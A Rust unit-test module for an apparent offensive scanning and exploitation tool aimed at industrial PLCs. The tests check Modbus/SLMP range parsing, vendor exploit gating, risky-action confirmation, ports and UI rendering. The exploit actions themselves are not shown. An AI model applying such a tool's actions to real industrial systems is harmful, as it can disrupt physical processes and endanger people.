                ModbusMapRange::new(ModbusTable::Input, 0, MODBUS_ADDRESS_SPACE),
                ModbusMapRange::new(ModbusTable::Coil, 0, MODBUS_ADDRESS_SPACE),
                ModbusMapRange::new(ModbusTable::Discrete, 0, MODBUS_ADDRESS_SPACE),
            ]
        );
    }

    #[test]
    fn parse_modbus_map_input_custom_ranges() {
        let ranges =
            parse_modbus_map_input("hr:0:500,input-registers:10:20,co:5:6,di:7:8").unwrap();
        assert_eq!(ranges[0], ModbusMapRange::new(ModbusTable::Holding, 0, 500));
        assert_eq!(ranges[1], ModbusMapRange::new(ModbusTable::Input, 10, 20));
        assert_eq!(ranges[2], ModbusMapRange::new(ModbusTable::Coil, 5, 6));
        assert_eq!(ranges[3], ModbusMapRange::new(ModbusTable::Discrete, 7, 8));
    }

    #[test]
    fn parse_modbus_map_input_rejects_invalid_specs() {
        assert!(parse_modbus_map_input("bad:0:1").is_err());
        assert!(parse_modbus_map_input("hr:65536:1").is_err());
        assert!(parse_modbus_map_input("hr:65535:2").is_err());
        assert!(parse_modbus_map_input("hr:0:0").is_err());
        assert!(parse_modbus_map_input("hr:0").is_err());
        assert!(parse_modbus_map_input("hr:0:1,").is_err());
    }

    #[test]
    fn modbus_map_chunks_respects_protocol_limits() {
        let words = modbus_map_chunks(ModbusMapRange::new(ModbusTable::Holding, 0, 251));
        assert_eq!(words, vec![(0, 125), (125, 125), (250, 1)]);

        let bits = modbus_map_chunks(ModbusMapRange::new(ModbusTable::Coil, 0, 4001));
        assert_eq!(bits, vec![(0, 2000), (2000, 2000), (4000, 1)]);

        let all_words = modbus_map_chunks(ModbusMapRange::new(
            ModbusTable::Input,
            0,
            MODBUS_ADDRESS_SPACE,
        ));
        assert_eq!(all_words.first().copied(), Some((0, 125)));
        assert_eq!(all_words.last().copied(), Some((65500, 36)));
    }

    #[test]
    fn modbus_point_keys_include_table_namespace() {
        assert_eq!(ModbusTable::Holding.point_key(0), "HR40001");
        assert_eq!(ModbusTable::Input.point_key(10_000), "IR40001");
        assert_eq!(ModbusTable::Coil.point_key(10_000), "CO10001");
        assert_eq!(ModbusTable::Discrete.point_key(0), "DI10001");
    }

    #[test]
    fn parse_slmp_map_input_defaults_to_quick() {
        let ranges = parse_slmp_map_input("").unwrap();
        assert_eq!(
            ranges,
            vec![
                SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, 50),
                SlmpMapRange::new("M", SlmpDeviceKind::Bit, 0, 128),
            ]
        );
        assert_eq!(parse_slmp_map_input("quick").unwrap(), ranges);
    }

    #[test]
    fn parse_slmp_map_input_common_and_all() {
        let common = parse_slmp_map_input("common").unwrap();
        assert_eq!(
            common[0],
            SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, 1000)
        );
        assert_eq!(
            common[6],
            SlmpMapRange::new("B", SlmpDeviceKind::Bit, 0, 512)
        );

        let all = parse_slmp_map_input("all").unwrap();
        assert_eq!(all.len(), 7);
        assert_eq!(
            all[0],
            SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, SLMP_ADDRESS_SPACE)
        );
        assert_eq!(
            all[6],
            SlmpMapRange::new("B", SlmpDeviceKind::Bit, 0, SLMP_ADDRESS_SPACE)
        );
    }

    #[test]
    fn parse_slmp_map_input_custom_ranges_and_aliases() {
        let ranges = parse_slmp_map_input("d:0:500,markers:10:20,link-registers:5:6").unwrap();
        assert_eq!(
            ranges[0],
            SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, 500)
        );
        assert_eq!(
            ranges[1],
            SlmpMapRange::new("M", SlmpDeviceKind::Bit, 10, 20)
        );
        assert_eq!(
            ranges[2],
            SlmpMapRange::new("W", SlmpDeviceKind::Word, 5, 6)
        );
    }

    #[test]
    fn parse_slmp_map_input_rejects_invalid_specs() {
        assert!(parse_slmp_map_input("bad:0:1").is_err());
        assert!(parse_slmp_map_input("d:16777216:1").is_err());
        assert!(parse_slmp_map_input("d:16777215:2").is_err());
        assert!(parse_slmp_map_input("d:0:0").is_err());
        assert!(parse_slmp_map_input("d:0").is_err());
        assert!(parse_slmp_map_input("d:0:1,").is_err());
    }

    #[test]
    fn slmp_map_chunks_respects_protocol_limits() {
        let words = slmp_map_chunks(SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, 1921));
        assert_eq!(words, vec![(0, 960), (960, 960), (1920, 1)]);

        let bits = slmp_map_chunks(SlmpMapRange::new("M", SlmpDeviceKind::Bit, 0, 7169));
        assert_eq!(bits, vec![(0, 3584), (3584, 3584), (7168, 1)]);
    }

    fn app_with_device(vendor: &str, fields: Value) -> App {
        let (tx, rx) = mpsc::channel();
        let mut list_state = ListState::default();
        list_state.select(Some(0));
        App {
            devices: vec![DeviceRecord {
                id: 1,
                ip: "192.168.1.10".to_string(),
                vendor: vendor.to_string(),
                last_seen: 0,
                fields,
            }],
            list_state,
            mode: Mode::Normal,
            zoom_from: Mode::Normal,
            quit_confirm: false,
            monitor_stop: None,
            input_buf: String::new(),
            output_lines: Vec::new(),
            output_scroll: 0,
            logs: VecDeque::new(),
            scan_rx: rx,
            scan_tx: tx,
            scan_menu_sel: 0,
            exploit_defs: exploits_for(vendor),
            exploit_sel: 0,
            pending_exploit: None,
            vendor_override: None,
            vendor_pick_sel: 0,
            filter: String::new(),
            filtered_indices: vec![0],
            active_jobs: 0,
            exploit_list_state: ratatui::widgets::ListState::default(),
            references_scroll: 0,
            stealth: false,
            mqtt_session: None,
            mqtt_broker: String::new(),
            mqtt_topics: Vec::new(),
            mqtt_retained: HashSet::new(),
            mqtt_total_msgs: 0,
            mqtt_topic_list_state: ListState::default(),
            mqtt_filter: String::new(),
            mqtt_attack_lines: Vec::new(),
            mqtt_attack_scroll: 0,
            mqtt_attack_label: String::new(),
            mqtt_username: String::new(),
            mqtt_password: String::new(),
            mqtt_conn: MqttConnSettings::default(),
            mqtt_attack_running: false,
            wordlist_path: None,
            export_format: ExportFormat::default(),
            tag_leaves: Vec::new(),
            tag_leaf_line_indices: Vec::new(),
            output_leaf_cursor: None,
            output_line_backup: None,
            tag_write_ip: String::new(),
            tag_write_port: 0,
            tag_write_vendor: String::new(),
            tag_write_pending: false,
            scan_timestamp: None,
            output_from_cache: false,
            pending_tag_write: None,
            per_device_output: std::collections::HashMap::new(),
            current_output_ip: String::new(),
            output_filter: String::new(),
            output_filter_active: false,
            output_has_tag_content: false,
        }
    }

    #[test]
    fn schneider_capabilities_do_not_assume_modbus_from_udp_identity() {
        let app = app_with_device(
            "schneider",
            serde_json::json!({
                "name": "TM241CE24T",
                "discovery_transport": "udp",
                "cap_identity_confirmed": true,
                "cap_schneider_udp": true,
                "cap_modbus_tcp": false,
                "web_port": 80
            }),
        );
        let caps = SchneiderCapabilities::from_device(app.selected_device().unwrap());
        assert!(caps.identity_confirmed);
        assert!(caps.udp_discovery_confirmed);
        assert!(!caps.modbus_tcp_confirmed);

        let map = &app.exploit_defs[4];
        assert!(!action_availability(&app, map).enabled);
    }

    #[test]
    fn schneider_generic_modbus_is_readable_but_not_identity_confirmed() {
        let app = app_with_device(
            "schneider",
            serde_json::json!({
                "name": "Schneider-compatible Modbus TCP 1502",
                "protocol": "modbus_tcp",
                "modbus_port": 1502,
                "cap_modbus_tcp": true,
                "cap_identity_confirmed": false
            }),
        );
        let caps = SchneiderCapabilities::from_device(app.selected_device().unwrap());
        assert!(caps.modbus_tcp_confirmed);
        assert!(!caps.identity_confirmed);

        assert!(action_availability(&app, &app.exploit_defs[4]).enabled);
        assert!(!action_availability(&app, &app.exploit_defs[0]).enabled);
    }

    #[test]
    fn schneider_fc90_availability_follows_family() {
        let classic = app_with_device(
            "schneider",
            serde_json::json!({
                "name": "Modicon M340",
                "protocol": "modbus_tcp",
                "modbus_port": 502,
                "cap_modbus_tcp": true,
                "cap_identity_confirmed": true,
                "fc90_family": "m340_quantum_premium"
            }),
        );
        assert!(action_availability(&classic, &classic.exploit_defs[15]).enabled);
        assert!(!action_availability(&classic, &classic.exploit_defs[17]).enabled);

        let tm221 = app_with_device(
            "schneider",
            serde_json::json!({
                "name": "TM221",
                "protocol": "modbus_tcp",
                "modbus_port": 502,
                "cap_modbus_tcp": true,
                "cap_identity_confirmed": true,
                "fc90_family": "tm221"
            }),
        );
        assert!(!action_availability(&tm221, &tm221.exploit_defs[15]).enabled);
        assert!(action_availability(&tm221, &tm221.exploit_defs[17]).enabled);
    }

    #[test]
    fn schneider_risky_actions_require_confirmation() {
        let app = app_with_device(
            "schneider",
            serde_json::json!({
                "protocol": "modbus_tcp",
                "modbus_port": 1502,
                "cap_modbus_tcp": true
            }),
        );
        assert!(!requires_confirmation(&app.exploit_defs[4]));
        assert!(requires_confirmation(&app.exploit_defs[1]));
        assert!(requires_confirmation(&app.exploit_defs[7]));
        assert!(requires_confirmation(&app.exploit_defs[12]));
    }

    #[test]
    fn protocol_capabilities_gate_non_schneider_actions() {
        let beckhoff = app_with_device(
            "beckhoff",
            serde_json::json!({
                "protocol": "ads_tcp",
                "ads_port": 48898,
                "web_port": 5120,
                "discovery_transport": "udp"
            }),
        );
        assert!(action_availability(&beckhoff, &beckhoff.exploit_defs[0]).enabled);
        assert!(action_availability(&beckhoff, &beckhoff.exploit_defs[6]).enabled);
        assert!(requires_confirmation(&beckhoff.exploit_defs[1]));
        assert!(requires_confirmation(&beckhoff.exploit_defs[8]));

        let no_ads = app_with_device(
            "beckhoff",
            serde_json::json!({
                "protocol": "ads_tcp",
                "ads_port": 48898,
                "cap_ads_tcp": false,
                "cap_beckhoff_web_candidate": true
            }),
        );
        assert!(!action_availability(&no_ads, &no_ads.exploit_defs[0]).enabled);
        assert!(action_availability(&no_ads, &no_ads.exploit_defs[3]).enabled);

        let mitsubishi = app_with_device(
            "mitsubishi",
            serde_json::json!({
                "plc_type": "Mitsubishi-compatible SLMP TCP 5007",
                "protocol": "slmp_tcp",
                "slmp_port": 5007,
                "cap_slmp_tcp": true,
                "cap_gxworks_udp": false
            }),
        );
        assert!(action_availability(&mitsubishi, &mitsubishi.exploit_defs[1]).enabled);
        assert!(!action_availability(&mitsubishi, &mitsubishi.exploit_defs[5]).enabled);
        assert!(requires_confirmation(&mitsubishi.exploit_defs[4]));
        assert!(requires_confirmation(&mitsubishi.exploit_defs[10]));
    }

    #[test]
    fn protocol_capability_fallbacks_cover_remaining_vendors() {
        for (vendor, fields) in [
            ("siemens", serde_json::json!({"s7_port": 102})),
            ("rockwell", serde_json::json!({"enip_port": 44818})),
            (
                "phoenix",
                serde_json::json!({"phoenix_info_port": 1962, "webvisit_port": 80}),
            ),
            ("ewon", serde_json::json!({"http_port": 80})),
            ("omron", serde_json::json!({"fins_port": 9600})),
            ("iec104", serde_json::json!({"iec104_port": 2404})),
        ] {
            let app = app_with_device(vendor, fields);
            assert!(
                action_availability(&app, &app.exploit_defs[0]).enabled,
                "{vendor} first action should be available"
            );
        }

        let udp_only_omron = app_with_device(
            "omron",
            serde_json::json!({
                "fins_port": 9600,
                "cap_fins_tcp": false,
                "cap_fins_udp": true
            }),
        );
        assert!(!action_availability(&udp_only_omron, &udp_only_omron.exploit_defs[0]).enabled);
    }

    #[test]
    fn action_port_uses_protocol_specific_ports() {
        let beckhoff = app_with_device(
            "beckhoff",
            serde_json::json!({"port": 48898, "ads_port": 49001, "web_port": 5120}),
        );
        assert_eq!(beckhoff.action_port("beckhoff", 0), 49001);
        assert_eq!(beckhoff.action_port("beckhoff", 3), 5120);

        let mitsubishi = app_with_device(
            "mitsubishi",
            serde_json::json!({"port": 5561, "slmp_port": 15007}),
        );
        assert_eq!(mitsubishi.action_port("mitsubishi", 4), 15007);
        assert_eq!(mitsubishi.action_port("mitsubishi", 8), 15007);

        let schneider = app_with_device(
            "schneider",
            serde_json::json!({"port": 1740, "modbus_port": 1502, "web_port": 8080}),
        );
        assert_eq!(schneider.action_port("schneider", 1), 8080);
        assert_eq!(schneider.action_port("schneider", 4), 1502);

        let phoenix = app_with_device(
            "phoenix",
            serde_json::json!({"port": 1962, "phoenix_info_port": 1962, "webvisit_port": 8080}),
        );
        assert_eq!(phoenix.action_port("phoenix", 0), 8080);
        assert_eq!(phoenix.action_port("phoenix", 4), 1962);
        assert_eq!(phoenix.action_port("phoenix", 5), 0);
        assert_eq!(phoenix.action_port("phoenix", 6), 0);

        let snmp = app_with_device("snmp", serde_json::json!({"snmp_port": 162}));
        assert_eq!(snmp.action_port("snmp", 0), 162);

        let snmp_default = app_with_device("snmp", serde_json::json!({}));
        assert_eq!(
            snmp_default.action_port("snmp", 0),
            casket::vendors::snmp::client::SNMP_PORT,
        );
    }

    #[test]
    fn compute_sweep_prefix_slash24_returns_correct_network() {
        use std::net::Ipv4Addr;
        let ip = Ipv4Addr::new(192, 168, 10, 45);
        let mask = Ipv4Addr::new(255, 255, 255, 0);
        let (net, host_bits) = compute_sweep_prefix(ip, mask);
        assert_eq!(net, Ipv4Addr::new(192, 168, 10, 0));
        assert_eq!(host_bits, 8);
    }

    #[test]
    fn compute_sweep_prefix_slash16_returns_16_host_bits() {
        use std::net::Ipv4Addr;
        let ip = Ipv4Addr::new(10, 20, 30, 5);
        let mask = Ipv4Addr::new(255, 255, 0, 0);
        let (net, host_bits) = compute_sweep_prefix(ip, mask);
        assert_eq!(net, Ipv4Addr::new(10, 20, 0, 0));
        assert_eq!(host_bits, 16);
    }

    fn open_temp_db_for_tui_test() -> Database {
        use std::io::Write;
        let id = std::thread::current().id();
        let path = std::env::temp_dir().join(format!("scadaver_tui_test_{id:?}.sqlite"));
        let db = Database::open(&path).unwrap();
        // register path for cleanup (best-effort)
        if let Ok(mut f) = std::fs::File::create(path.with_extension("rm")) {
            let _ = f.write_all(path.to_str().unwrap_or("").as_bytes());
        }
        db
    }

    #[test]
    fn tui_renders_initial_frame_without_panic() {
        use ratatui::{backend::TestBackend, Terminal};
        let db = open_temp_db_for_tui_test();
        let backend = TestBackend::new(120, 40);
        let mut terminal = Terminal::new(backend).unwrap();
        let mut app = App::new(&db);
        terminal.draw(|f| app.draw(f)).unwrap();
        let buf = terminal.backend().buffer().clone();
        let has_content = buf.content().iter().any(|c| c.symbol() != " ");
        assert!(has_content, "TUI frame should contain rendered content");
    }

    #[test]
    fn tui_empty_device_list_renders_without_panic() {
        use ratatui::{backend::TestBackend, Terminal};
        let db = open_temp_db_for_tui_test();
        let backend = TestBackend::new(80, 24);
        let mut terminal = Terminal::new(backend).unwrap();
        let mut app = App::new(&db);
        terminal.draw(|f| app.draw(f)).unwrap();
        // No assertion — just verify no panic on empty state.
    }

}
